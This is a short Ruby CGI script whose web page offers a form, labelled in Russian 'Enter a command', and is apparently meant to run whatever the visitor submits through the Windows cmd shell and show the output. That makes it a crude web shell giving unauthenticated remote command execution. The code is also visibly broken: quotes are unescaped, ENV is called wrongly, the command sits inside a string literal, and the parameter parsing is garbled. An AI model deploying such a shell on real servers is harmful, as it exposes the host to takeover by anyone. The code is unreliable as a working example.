puts "Content-type: text/html\n\n"
puts '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">'
puts "\n<html><body>\n"
puts '<form method="GET" action="ruby.exe cgi.rb" accept-charset="windows-1251" target="_self">\n'
puts "<p><b>Введите комманду:</b></p>\n"
puts "<p><input type="text" name="command" size="30"><br>\n"
puts "<input type="submit">\n"
puts "</form>\n"
puts "Результат:<br>\n<p>"
puts "`cmd #{ENV('QUERY_STRING').to_s.[/[\=].*[\&]/].[1..$-1]}` </p>\n"
puts "\n</body></html>\n"